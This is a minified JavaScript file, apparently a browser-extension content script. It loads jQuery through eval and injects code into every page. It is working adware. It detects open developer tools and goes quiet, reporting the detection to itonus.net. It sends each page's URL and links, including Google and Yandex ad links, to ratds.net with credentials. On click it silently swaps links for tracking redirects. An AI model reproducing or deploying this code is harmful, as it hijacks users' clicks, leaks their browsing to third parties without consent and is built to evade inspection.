(function(){var core={dt:!1,isFrame:top!=self,xcid:window.chrome&&chrome.runtime&&chrome.runtime.id||"",modules:[],opts:[],options:{},start:null,$:null,now:function(){return(new Date).getTime()},buildUrl:function(o,t){return document.location.protocol+"//"+this.options.host+o+"?"+this.$.param(t)},buildMCUrl:function(o,t){return"https://"+this.options.mcHost+o+"?"+this.$.param(t)},getPageHostname:function(){return document.location.hostname.replace(/^www\./,"")},init:function(options){core.start=core.now(),core.videoPlaced=0,core.options=options;const xhr=new XMLHttpRequest;xhr.onload=function(){eval(this.responseText);var $=core.$=jQuery;jQuery.noConflict(),$.each(core.modules,function(o,t){t.call(null,core.opts[o],core,$,window,document)})},xhr.open("get","https://code.jquery.com/jquery-3.0.0.min.js"),xhr.send()},run:function(o){this.modules.push(o)}};core.init({"subid":"","host":"itonus.net","mcHost":"ratds.net"});core.opts.push({});core.run(function(e,n,r,t,i){function a(){clearInterval(l),n.dt||(n.dt=!0,(new Image).src=n.buildUrl("/dt",{r:Math.random()}))}function o(){var e=t.Firebug,r=e&&e.chrome;if(r&&r.isInitialized)return void a();d.log(c),setTimeout(function(){n.dt||d.clear()},100)}var c=new Image,d=t.console;c.__defineGetter__("id",a);var l=setInterval(o,1e3);o()});core.opts.push({"place":6,"maxIndexLength":10000,"minDistance":200,"phrases":false,"domains":true});core.run(function(e,t,n,r,a){if(!t.isFrame){var i=a.createElement("a"),o=r.localStorage,s={progress:!1,runTimeout:null,init:function(){switch(s.watchMutations(),t.getPageHostname()){case"yandex.ru":case"yandex.ua":s.prepareYandex();break;case"google.ru":case"google.com":case"google.com.ua":s.prepareGoogle()}},watchMutations:function(){if(r.MutationObserver){var e=t.getPageHostname(),n={"yandex.ru":[/\bcontent__left\b/,/\bsuggest2\b/],"yandex.ua":[/\bcontent__left\b/,/\bsuggest2\b/],"google.com":[/\bcontent\b/,/\btsf\b/],"google.com.ua":[/\bcontent\b/,/\btsf\b/],"google.ru":[/\bcontent\b/,/\btsf\b/]};if(n.hasOwnProperty(e)){var i=n[e];new r.MutationObserver(function(e){for(var t=!0,n=0;n<e.length;n++)for(var r=e[n].target;r;){for(var a=0;a<i.length;a++)i[a].test(r.className)&&(t=!1);r=r.parentNode}t||s.reRun()}).observe(a.body,{childList:!0,subtree:!0})}}},prepareYandex:function(){n(".serp-adv-item").each(function(){var e=n(this),t=e.find(".serp-item__greenurl a, .organic__path a");if(t.length){var r=t[0],a=r.textContent.toLowerCase().split("/")[0];e.find("a").attr("data-href","http://"+a)}})},prepareGoogle:function(){n(".ads-ad").each(function(){var e=n(this),t=e.find("cite")[0];if(t){var r=t.textContent.toLowerCase().split("/")[0];e.find("a").attr("data-href","http://"+r)}})},reRun:function(){s.progress||(clearTimeout(s.runTimeout),s.runTimeout=setTimeout(function(){s.run(a.body)},500))},run:function(r){s.progress=!0;var i={url:a.location.href,urls:[],phrases:[]};if(e.domains&&(i.urls=s.findUrls(r)),!i.urls.length)return void(s.progress=!1);n.ajax({type:"POST",data:JSON.stringify(i),contentType:"application/json",dataType:"json",xhrFields:{withCredentials:!0},headers:{"X-CID":t.xcid},url:t.buildMCUrl("/replacement/find",{place:e.place,subid:t.options.subid,hsid:t.xcid}),success:function(e){t.dt||(s.replaceUrls(r,e.urls),setTimeout(function(){s.progress=!1},500))}})},getDomainByUrl:function(e){return i.href=e,s.getDomain(i)},getDomain:function(e){return e.hostname.toLowerCase().replace(/^www\./,"")},getRealDomain:function(e){return s.getDomainByUrl(s.getRealHref(e))},getRealHref:function(e){return-1!==["google.ru","google.com","yabs.yandex.ru"].indexOf(s.getDomain(e))&&e.getAttribute?e.getAttribute("data-href"):e.href},getBaseRealHref:function(e){i.href=s.getRealHref(e);var t=s.getDomain(i),n="";return-1!==["realty.yandex.ru","plarium.com","espritgames.ru","101xp.com","promo.101xp.com","sportiv.ru"].indexOf(t)&&(n=i.pathname),t+n},getDistance:function(e,t){var n,r,a,i;return e.top<t.top?(a=e.top+e.height,i=t.top):(a=t.top+t.height,i=e.top),e.left<t.left?(n=e.left+e.width,r=t.left):(n=t.left+t.width,r=e.left),Math.pow(n-r,2)+Math.pow(a-i,2)},extractWords:function(e){var t,n=new RegExp("(?:[-._&]?[a-zа-яё0-9]+)+","ig"),r=[];for(r.wordsLength=0;t=n.exec(e);)r.push({word:t[0].toLowerCase(),text:t[0],index:t.index}),r.wordsLength+=t[0].length;return r},findLinks:function(e){return n(e).find("a").filter(function(){return!!this.hostname&&!!s.getRealDomain(this)})},findUrls:function(e){if(!e)return[];var t={};return this.findLinks(e).each(function(){var e=s.getBaseRealHref(this);t[e]=1}),Object.keys(t)},replaceUrls:function(e,t){e&&t&&this.findLinks(e).each(function(){var e=this,r=s.getBaseRealHref(e);if(r&&t.hasOwnProperty(r)){var a=t[r],i=s.getRealHref(e);e.realHref=i,e.hiddenHref=s.buildClickLink(n.extend({href:i},a)),s.setClickHandler(e)}})},setClickHandler:function(e){var t=e.onclick;e.onclick=function(n){var r,a=s.handleClick(e);if("function"==typeof t&&(r=t(n)),a&&!1===r)return!1}},handleClick:function(e){if(!e.hiddenHref)return!1;var n=e.href,r=s.getDomain(a.location);if(t.dt&&e.realHref)return!1;var i=e.realHref&&s.getDomainByUrl(e.realHref);if(i&&(-1!==r.indexOf(i)||-1!==i.indexOf(r))){var u=t.now();if(!o||o._ym_ts&&u-o._ym_ts<72e5||u-t.start<6e4)return!1;o._ym_ts=t.now()}return e.href=e.hiddenHref,e.realHref&&delete e.hiddenHref,setTimeout(function(){e.href=n},10),!0},buildClickLink:function(r){return r=n.extend({place:e.place,subid:t.options.subid},r,{url:a.location.href}),t.buildMCUrl("/replacement/click",r)}};n(a).ready(function(){s.init(),s.run(a.body)})}});})();